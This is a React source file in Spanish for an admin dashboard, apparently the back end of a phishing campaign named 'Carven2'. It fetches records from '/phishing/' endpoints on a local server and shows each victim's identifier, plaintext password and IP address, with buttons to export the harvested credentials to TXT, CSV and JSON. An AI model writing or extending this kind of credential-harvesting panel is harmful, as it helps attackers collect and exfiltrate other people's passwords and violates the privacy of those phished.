import { useState, useEffect } from "react";

function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [registros, setRegistros] = useState([]);
  const [stats, setStats] = useState({
    total: 0,
    hoyRegistros: 0,
    intentos: 0,
    visitas: 0,
  });
  const [loading, setLoading] = useState(true);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [pendingDeleteId, setPendingDeleteId] = useState(null);
  const [pendingDeleteAll, setPendingDeleteAll] = useState(false);

  const API_URL = "http://192.168.28.35:3002";

  const verifyPassword = async () => {
    try {
      const response = await fetch(`${API_URL}/phishing/verify-admin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: password }),
      });
      const data = await response.json();

      if (data.success) {
        setIsAuthenticated(true);
        cargarDatos();
      } else {
        alert("Contraseña incorrecta");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Error de conexión con el servidor");
    }
  };

  const cargarDatos = async () => {
    try {
      setLoading(true);
      const response = await fetch(`${API_URL}/phishing/registros`);
      const data = await response.json();
      setRegistros(data.registros || []);

      const statsResponse = await fetch(`${API_URL}/phishing/stats`);
      const statsData = await statsResponse.json();
      setStats(statsData);
    } catch (error) {
      console.error("Error cargando datos:", error);
    } finally {
      setLoading(false);
    }
  };

  const deleteRegistro = async (id) => {
    try {
      const response = await fetch(`${API_URL}/phishing/delete/${id}`, {
        method: "DELETE",
      });
      const data = await response.json();
      if (data.success) {
        await cargarDatos();
        alert(`Registro ${id} eliminado`);
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Error al eliminar");
    }
  };

  const deleteAllRegistros = async () => {
    try {
      const response = await fetch(`${API_URL}/phishing/delete-all`, {
        method: "DELETE",
      });
      const data = await response.json();
      if (data.success) {
        await cargarDatos();
        alert(`Se eliminaron ${data.eliminados} registros`);
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Error al eliminar todos");
    }
  };

  const exportToTXT = async () => {
    try {
      const response = await fetch(`${API_URL}/phishing/export/txt`);
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `phishing_registros_${new Date().toISOString().slice(0, 19)}.txt`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      window.URL.revokeObjectURL(url);
      alert("Exportación completada");
    } catch (error) {
      console.error("Error:", error);
      alert("Error al exportar");
    }
  };

  const exportToExcel = async () => {
    try {
      const response = await fetch(`${API_URL}/phishing/export/excel`);
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `phishing_registros_${new Date().toISOString().slice(0, 19)}.csv`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      window.URL.revokeObjectURL(url);
      alert("Exportación completada");
    } catch (error) {
      console.error("Error:", error);
      alert("Error al exportar");
    }
  };

  const verJSON = () => {
    window.open(`${API_URL}/phishing/json`, "_blank");
  };

  const descargarJSON = () => {
    window.open(`${API_URL}/phishing/download-json`, "_blank");
  };

  const confirmDeleteOne = (id) => {
    setPendingDeleteId(id);
    setPendingDeleteAll(false);
    setShowConfirmModal(true);
  };

  const confirmDeleteAll = () => {
    setPendingDeleteAll(true);
    setPendingDeleteId(null);
    setShowConfirmModal(true);
  };

  const executeDelete = async () => {
    if (pendingDeleteAll) {
      await deleteAllRegistros();
    } else if (pendingDeleteId) {
      await deleteRegistro(pendingDeleteId);
    }
    setShowConfirmModal(false);
    setPendingDeleteId(null);
    setPendingDeleteAll(false);
  };

  const formatFecha = (fecha) => {
    const date = new Date(fecha);
    return date.toLocaleString("es-MX", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  };

  if (!isAuthenticated) {
    return (
      <div
        style={{
          minHeight: "100vh",
          background: "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          padding: "20px",
        }}
      >
        <div
          style={{
            background: "white",
            padding: "40px",
            borderRadius: "20px",
            maxWidth: "400px",
            width: "100%",
            textAlign: "center",
            boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
          }}
        >
          <div style={{ fontSize: "48px", marginBottom: "20px" }}>🔐</div>
          <h2 style={{ color: "#1e3c72", marginBottom: "10px" }}>
            Panel de Administración
          </h2>
          <p style={{ marginBottom: "20px", color: "#666" }}>
            Ingrese la contraseña para acceder
          </p>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Contraseña"
            style={{
              width: "100%",
              padding: "12px",
              marginBottom: "20px",
              border: "2px solid #ddd",
              borderRadius: "8px",
              fontSize: "16px",
            }}
            onKeyPress={(e) => e.key === "Enter" && verifyPassword()}
          />
          <button
            onClick={verifyPassword}
            style={{
              width: "100%",
              padding: "12px",
              background: "#ff6b35",
              color: "white",
              border: "none",
              borderRadius: "8px",
              fontSize: "16px",
              cursor: "pointer",
            }}
          >
            Acceder
          </button>
          <p style={{ marginTop: "20px", fontSize: "12px", color: "#999" }}>
            Solo personal autorizado
          </p>
        </div>
      </div>
    );
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)",
        padding: "20px",
      }}
    >
      {/* Modal de confirmación */}
      {showConfirmModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            background: "rgba(0,0,0,0.8)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 2000,
          }}
        >
          <div
            style={{
              background: "white",
              padding: "30px",
              borderRadius: "20px",
              maxWidth: "400px",
              textAlign: "center",
            }}
          >
            <div style={{ fontSize: "48px", marginBottom: "10px" }}>⚠️</div>
            <h3>Confirmar eliminación</h3>
            <p style={{ marginTop: "10px", color: "#666" }}>
              {pendingDeleteAll
                ? "¿Estás seguro de que deseas eliminar TODOS los registros? Esta acción es irreversible."
                : "¿Estás seguro de que deseas eliminar este registro?"}
            </p>
            <div style={{ marginTop: "20px" }}>
              <button
                onClick={executeDelete}
                style={{
                  background: "#dc3545",
                  color: "white",
                  padding: "10px 20px",
                  border: "none",
                  borderRadius: "8px",
                  cursor: "pointer",
                  marginRight: "10px",
                }}
              >
                Sí, eliminar
              </button>
              <button
                onClick={() => setShowConfirmModal(false)}
                style={{
                  background: "#6c757d",
                  color: "white",
                  padding: "10px 20px",
                  border: "none",
                  borderRadius: "8px",
                  cursor: "pointer",
                }}
              >
                Cancelar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <div
        style={{
          background: "white",
          borderRadius: "15px",
          padding: "20px",
          marginBottom: "20px",
          boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
        }}
      >
        <button
          onClick={() => setIsAuthenticated(false)}
          style={{
            float: "right",
            background: "#dc3545",
            color: "white",
            border: "none",
            padding: "8px 15px",
            borderRadius: "8px",
            cursor: "pointer",
          }}
        >
          🚪 Cerrar Sesión
        </button>
        <h1 style={{ color: "#1e3c72", marginBottom: "5px" }}>
          🎯 Panel de Monitoreo - Carven2
        </h1>
        <p style={{ color: "#666" }}>
          Visualiza quién se conecta, desde dónde y cuándo
        </p>
      </div>

      {/* Estadísticas */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
          gap: "15px",
          marginBottom: "20px",
        }}
      >
        <div
          style={{
            background: "white",
            padding: "20px",
            borderRadius: "15px",
            textAlign: "center",
            boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
          }}
        >
          <div
            style={{ fontSize: "36px", fontWeight: "bold", color: "#ff6b35" }}
          >
            {stats.total}
          </div>
          <div style={{ color: "#666" }}>Total Registros</div>
        </div>
        <div
          style={{
            background: "white",
            padding: "20px",
            borderRadius: "15px",
            textAlign: "center",
            boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
          }}
        >
          <div
            style={{ fontSize: "36px", fontWeight: "bold", color: "#ff6b35" }}
          >
            {stats.hoyRegistros}
          </div>
          <div style={{ color: "#666" }}>Registros Hoy</div>
        </div>
        <div
          style={{
            background: "white",
            padding: "20px",
            borderRadius: "15px",
            textAlign: "center",
            boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
          }}
        >
          <div
            style={{ fontSize: "36px", fontWeight: "bold", color: "#ff6b35" }}
          >
            {stats.intentos}
          </div>
          <div style={{ color: "#666" }}>Intentos de Login</div>
        </div>
        <div
          style={{
            background: "white",
            padding: "20px",
            borderRadius: "15px",
            textAlign: "center",
            boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
          }}
        >
          <div
            style={{ fontSize: "36px", fontWeight: "bold", color: "#ff6b35" }}
          >
            {stats.visitas}
          </div>
          <div style={{ color: "#666" }}>Visitas</div>
        </div>
      </div>

      {/* Botones de acción */}
      <div
        style={{
          background: "white",
          padding: "15px",
          borderRadius: "15px",
          marginBottom: "20px",
          textAlign: "center",
          boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
        }}
      >
        <button
          onClick={exportToTXT}
          style={{
            background: "#4CAF50",
            color: "white",
            border: "none",
            padding: "10px 20px",
            borderRadius: "8px",
            cursor: "pointer",
            margin: "0 10px",
            fontSize: "14px",
          }}
        >
          📄 Exportar a TXT
        </button>
        <button
          onClick={exportToExcel}
          style={{
            background: "#2196F3",
            color: "white",
            border: "none",
            padding: "10px 20px",
            borderRadius: "8px",
            cursor: "pointer",
            margin: "0 10px",
            fontSize: "14px",
          }}
        >
          📊 Exportar a Excel
        </button>
        <button
          onClick={verJSON}
          style={{
            background: "#9C27B0",
            color: "white",
            border: "none",
            padding: "10px 20px",
            borderRadius: "8px",
            cursor: "pointer",
            margin: "0 10px",
            fontSize: "14px",
          }}
        >
          📄 Ver JSON
        </button>
        <button
          onClick={descargarJSON}
          style={{
            background: "#FF9800",
            color: "white",
            border: "none",
            padding: "10px 20px",
            borderRadius: "8px",
            cursor: "pointer",
            margin: "0 10px",
            fontSize: "14px",
          }}
        >
          ⬇ Descargar JSON
        </button>
        <button
          onClick={confirmDeleteAll}
          style={{
            background: "#6c757d",
            color: "white",
            border: "none",
            padding: "10px 20px",
            borderRadius: "8px",
            cursor: "pointer",
            margin: "0 10px",
            fontSize: "14px",
          }}
        >
          ⚠️ Eliminar todos
        </button>
      </div>

      {/* Tabla de registros */}
      <div
        style={{
          background: "white",
          borderRadius: "15px",
          overflowX: "auto",
          boxShadow: "0 5px 15px rgba(0,0,0,0.1)",
        }}
      >
        {loading ? (
          <div style={{ textAlign: "center", padding: "50px", color: "#666" }}>
            <div style={{ fontSize: "24px", marginBottom: "10px" }}>🔄</div>
            Cargando datos...
          </div>
        ) : registros.length === 0 ? (
          <div style={{ textAlign: "center", padding: "50px", color: "#666" }}>
            <div style={{ fontSize: "48px", marginBottom: "10px" }}>📭</div>
            No hay registros aún
          </div>
        ) : (
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ background: "#ff6b35" }}>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  ID
                </th>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  CH
                </th>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  Contraseña
                </th>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  IP
                </th>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  Fecha/Hora
                </th>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  Tipo
                </th>
                <th
                  style={{ padding: "12px", textAlign: "left", color: "white" }}
                >
                  Acciones
                </th>
              </tr>
            </thead>
            <tbody>
              {registros.map((reg) => (
                <tr key={reg.id} style={{ borderBottom: "1px solid #eee" }}>
                  <td style={{ padding: "12px" }}>{reg.id}</td>
                  <td
                    style={{
                      padding: "12px",
                      fontWeight: "bold",
                      color: "#ff6b35",
                    }}
                  >
                    {reg.ch}
                  </td>
                  <td style={{ padding: "12px", fontFamily: "monospace" }}>
                    {reg.password}
                  </td>
                  <td style={{ padding: "12px" }}>
                    <code>{reg.ipAddress}</code>
                  </td>
                  <td style={{ padding: "12px", fontSize: "12px" }}>
                    {formatFecha(reg.fechaHora)}
                  </td>
                  <td style={{ padding: "12px" }}>
                    <span
                      style={{
                        display: "inline-block",
                        padding: "4px 10px",
                        borderRadius: "20px",
                        fontSize: "11px",
                        fontWeight: "bold",
                        background:
                          reg.tipo === "intento" ? "#ff6b35" : "#4CAF50",
                        color: "white",
                      }}
                    >
                      {reg.tipo === "intento" ? "🔐 Intento" : "👁️ Visita"}
                    </span>
                  </td>
                  <td style={{ padding: "12px" }}>
                    <button
                      onClick={() => confirmDeleteOne(reg.id)}
                      style={{
                        background: "#dc3545",
                        color: "white",
                        border: "none",
                        padding: "6px 12px",
                        borderRadius: "6px",
                        cursor: "pointer",
                        fontSize: "12px",
                      }}
                    >
                      🗑️ Eliminar
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}

export default AdminPanel;
